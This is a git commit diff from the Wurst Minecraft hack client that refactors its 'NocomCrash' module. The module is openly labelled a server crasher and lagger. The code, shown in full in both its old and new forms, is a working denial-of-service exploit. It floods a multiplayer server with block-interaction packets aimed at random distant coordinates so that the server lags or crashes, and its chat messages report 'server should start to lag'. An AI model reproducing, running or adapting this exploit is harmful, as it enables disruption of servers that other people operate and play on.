1a46c0bbebfe77ab7a022993d97adb54c804e40b
Alexander01998 <contact.wurstimperium@gmail.com>
2022-02-01 16:00:38 +0100

    Clean up

--- src/main/java/net/wurstclient/hacks/NocomCrashHack.java
+++ src/main/java/net/wurstclient/hacks/NocomCrashHack.java
@@ -7,10 +7,10 @@
  */
 package net.wurstclient.hacks;
 
-import java.util.Objects;
+import java.text.NumberFormat;
+import java.util.Locale;
 import java.util.Random;
 
-import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
 import net.minecraft.util.Hand;
 import net.minecraft.util.hit.BlockHitResult;
@@ -24,58 +24,85 @@ import net.wurstclient.settings.SliderSetting;
 import net.wurstclient.settings.SliderSetting.ValueDisplay;
 import net.wurstclient.util.ChatUtils;
 
-@SearchTags({ "server crasher", "nocom crash", "lag" })
-public final class NocomCrashHack extends Hack {
-	Random rand = new Random();
-
-	private final SliderSetting packets = new SliderSetting("Number of packets", 500, 1, 1000, 1, ValueDisplay.INTEGER);
-
-	public NocomCrashHack() {
+@SearchTags({"nocom crash", "ServerCrasher", "server crasher", "ServerLagger",
+	"server lagger"})
+public final class NocomCrashHack extends Hack
+{
+	private final Random random = new Random();
+	
+	private final SliderSetting packets =
+		new SliderSetting("Packets", "The number of packets to send.", 500, 1,
+			1000, 1, ValueDisplay.INTEGER);
+	
+	public NocomCrashHack()
+	{
 		super("NocomCrash");
 		setCategory(Category.OTHER);
 		addSetting(packets);
 	}
-
+	
 	@Override
-	public void onEnable() {
-		ChatUtils.message("Sending packets. Will take approximately "
-				+ packets.getValueI() * 10 + "ms");
-
-		Thread t = new Thread(() -> {
-			try {
-				for (int i = 0; i < packets.getValueI(); i++) {
-					// display current packet
-					if (i % 100 == 0 || i == packets.getValueI())
-						ChatUtils.message(String.format("%d/%d", i, packets.getValueI()));
-
-					if (MC.getNetworkHandler() == null)
-						break;
-
-					Thread.sleep(10L);
-
-					// generate and send the packet
-					Vec3d cpos = pickRandomPos();
-					PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND,
-							new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
-					((ClientPlayNetworkHandler) Objects.requireNonNull(MC.getNetworkHandler())).sendPacket(packet);
-				}
-
+	public void onEnable()
+	{
+		String seconds = NumberFormat.getNumberInstance(Locale.ENGLISH)
+			.format(packets.getValueI() / 100.0);
+		ChatUtils.message(
+			"Sending packets. Will take approximately " + seconds + "s.");
+		
+		Thread thread = new Thread(() -> {
+			
+			try
+			{
+				sendPackets(packets.getValueI());
 				ChatUtils.message("Done sending, server should start to lag");
-			} catch (Exception e) {
+				
+			}catch(Exception e)
+			{
 				e.printStackTrace();
-				ChatUtils.error("Failed to crash, caught " + e.getClass().getSimpleName() + ".");
+				ChatUtils.error("Failed to crash, caught "
+					+ e.getClass().getSimpleName() + ".");
 			}
-
 			setEnabled(false);
-		});
-
-		t.start();
+			
+		}, "NocomCrash");
+		
+		thread.start();
 	}
-
-	private Vec3d pickRandomPos() {
-		int x = rand.nextInt(16777215);
+	
+	public void sendPackets(int nPackets) throws InterruptedException
+	{
+		for(int i = 0; i < nPackets; i++)
+		{
+			// display current packet
+			if(i % 100 == 0 || i == nPackets)
+				ChatUtils.message(String.format("%d/%d", i, nPackets));
+			
+			if(MC.getNetworkHandler() == null)
+				break;
+			
+			Thread.sleep(10);
+			
+			// generate and send the packet
+			PlayerInteractBlockC2SPacket packet = createNocomPacket();
+			MC.getNetworkHandler().sendPacket(packet);
+		}
+	}
+	
+	public PlayerInteractBlockC2SPacket createNocomPacket()
+	{
+		Vec3d pos = pickRandomPos();
+		BlockHitResult blockHitResult =
+			new BlockHitResult(pos, Direction.DOWN, new BlockPos(pos), false);
+		
+		return new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult);
+	}
+	
+	private Vec3d pickRandomPos()
+	{
+		int x = random.nextInt(16777215);
 		int y = 255;
-		int z = rand.nextInt(16777215);
+		int z = random.nextInt(16777215);
+		
 		return new Vec3d(x, y, z);
 	}
 }
